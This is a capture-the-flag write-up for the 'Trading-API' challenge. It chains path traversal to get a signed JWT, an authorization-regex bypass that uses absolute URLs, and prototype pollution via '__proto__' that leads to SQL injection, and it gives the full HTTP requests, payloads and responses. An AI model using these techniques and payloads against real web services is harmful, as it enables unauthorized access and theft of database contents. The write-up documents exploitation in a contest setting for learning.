# Trading-API

This game was extremely challenging and we were not able to finish it during the CTF. 
Sadly, we did not notice the easiest vulnerability, but still it's been really interesting.

## Intro
The DB contains a `transactions` table with:
- id (big int)
- username (text)
- asset (text)
- amount (int)

and a table `flag` containing the flag in the `flag` (text) field.

The trading API db role has access to `flag` and `transaction` tables.

## Obtaining a valid JWT through path traversal

> TL;DR we can use path traversal to /health to obtain a valid JWT

To access the API we need to login through `authn.js`, which checks the username and password and returns  a JWT signed for that user.

A request to `/api/auth/login` creates a request to
`/api/users/:username/auth` (with password as json in body). The response code is used to sign a token for the user.

```
const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, {
	headers: { authorization: AUTH_API_TOKEN },
	json: { password },
});
if (r.statusCode !== 200) {
	return res.status(401).send('wrong');
}
const jwt = jsonwebtoken.sign({ username }, JWT_SECRET);
return res.json({ token: jwt });
```

Since in  the `/health` path we can have as a response a `200` code,
we can redirect to `/health#auth` and obtain a valid JWT, without the request to `/auth`.

Note that we can also specify an array as username, and we inserted also the `txId` string, whose need will be explained later.

```
POST /api/auth/login HTTP/1.1
Content-Length: 78
authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6WyJ3YXJyZW5idWZmZXR0NjkvLi4vLi4vLi4vaGVhbHRoIyIsIndhcnJlbmJ1ZmZldHQ2OSJdLCJpYXQiOjE2MzU2MTE4ODN9.vrCgjOFTeFlrjaCvfApg_S-YienmzE0F3RsfaFuzDJo
Content-Type: application/json
...
Connection: close

{
	"username":["spritz/../../../health#", "::txId"],
	"password":"campari"
}
```

Response: 
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 181
Connection: close

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6WyJzcHJpdHovLi4vLi4vLi4vaGVhbHRoIyIsIjo6dHhJZCJdLCJpYXQiOjE2MzU3Mjc2OTZ9.j__LeYofEKnK94JA-0kW9-u8ZLlrX7AyQfci4a4Q1Pk"}
```

So we obtain a valid JWT, signed to the supplied user (an array).

## Accessing api/priv/.*

> TL;DR: We can access to `api/priv/` by avoiding the Regex using the full path.

The access to `api/priv/*` is blocked in `authz.js`:

```
function hasPermission(userPermissions, username, permission) {
	return userPermissions.get(username)?.includes(permission) ?? false;
}

...

if (regex.test(req.url) && !hasPermission(userPermissions, username, permission)) {
	return res.status(403).send('forbidden');
}


```

And in `server.js`:
```
app.use(authz({
	userPermissions: new Map(Object.entries({
	warrenbuffett69: [Permissions.VERIFIED],
	})),
	routePermissions: [
		[/^\/+api\/+priv\//i, Permissions.VERIFIED],
	],
}));
```

So we should break one of the 2 conditions in the if.
We are not able to break the second one, since only the `warrenbuffet69` user is allowed to access the path `/api/priv/.+`.

The first condition is instead a regex check defined as: `/^\/+api\/+priv\//i` which matches all the variant of the `api/priv/` path, but not the full path `http://127.0.0.1:3000/api/priv/`, which is not blocked. By using the full path in our requests (using Burp) we are able to overcome `authz`

## SQLi through Prototype pollution
> TL;DR we use prototype pollution to avoid filters and perform a SQLi

Now that we have access to the `PUT` method, we want to use the the db query to insert in a transaction the content of the `flag` table.

The `PUT` requests add a table in the th db according to the parameters in the `PUT` url `/api/priv/assets/:asset/:action` in the following lines:

```
const query = prepare('INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)', {
						amount,
						asset,
						username,
						txId,
						}
);
```

which sanitizes the values in the `prepare` function: 
```
function prepare(query, namedParams) {
	let filledQuery = query;

	const escapedParams = Object.fromEntries(
		Object.entries(namedParams).map(([key, value]) => ([key, sqlEscape(value)]))
	);

	for (const key in escapedParams) {
		filledQuery = filledQuery.replaceAll(`:${key}`, escapedParams[key]);
	}

	return filledQuery;

}
```

The key are sanitized with `sqlEscape` function: 

```
function sqlEscape(value) {
	switch (typeof value) {

		case 'string':
			return `'${value.replace(/[^\x20-\x7e]|[']/g, '')}'`;

		case 'number':
			return isFinite(value) ? String(value) : sqlEscape(String(value));

		case 'boolean':
			return String(value);
			
		default:
			return value == null ? 'NULL' : sqlEscape(JSON.stringify(value));

	}
}
 ```





### Prototype pollution
We can note that we might be able to perform a  prototype pollution in the lines which prepares the db insertion:

```
const assetTransactions = transactions[asset] ?? (transactions[asset] = {});
assetTransactions[txId] = action;
```

which basically allows us to set the `txId` key to `action` using `__proto__` as the `asset` parameter

`transactions[__proto__][txId] = action`.

this will be useful in the future.

### Using txId as a key

The keys of the object are sanitized in the `sqlEscape` function, but not the prototype ones, so the value of the key `txId` can contain the sql injection, but we can't use this key since we don't know it, because `txId` is randomly generated every for every transaction.

However, if we are able to specify `txId` in a query parameters, the `prepare` function will change it to the actual value and then will access the value for that key.

What we can do is use `::txId` in the username of the JWT (remember the body request in the first paragraph), so the `prepare` function will interpret `:txId` as a key,which will be replaced with its values, which is the `action` parameter we supplied.

### SQLi

This allows us to use the value which we polluted in the prototype, whose key is `txId`. As we state before, its values has not been sanitized, so we can specify as `action` a SQL injection:
`"',(41,'xxx',1,(SELECT%20flag%20FROM%20flag))--`

which insert at txId 41 the data `(41,xxx,1, the_flag)`

The final payload will be:

```
PUT http://127.0.0.1:3000/api/priv/assets/__proto__/"'),(41,'xxx',1,(SELECT%20flag%20FROM%20flag))-- HTTP/1.1
authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6WyJzcHJpdHovLi4vLi4vLi4vaGVhbHRoIyIsIjo6dHhJZCJdLCJpYXQiOjE2MzU3Mjc2OTZ9.j__LeYofEKnK94JA-0kW9-u8ZLlrX7AyQfci4a4Q1Pk
...
Connection: close
```
Response:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 22
...
Connection: close

{"id":247341473789376}
```

However we are not interested in the id, since we inserted at transaction `41` the flag:
We access it through the `GET` request:

```
GET http://127.0.0.1:3000/api/transactions/41 HTTP/1.1
authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6WyJzcHJpdHovLi4vLi4vLi4vaGVhbHRoIyIsIjo6dHhJZCJdLCJpYXQiOjE2MzU3Mjc2OTZ9.j__LeYofEKnK94JA-0kW9-u8ZLlrX7AyQfci4a4Q1Pk
...
Connection: close
```

Whose response contains the flag:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 82
...
Connection: close

{"id":"41","username":"flag{finally_i_can_invest_in_js}","asset":"xxx","amount":1}
```

`flag{finally_i_can_invest_in_js}`
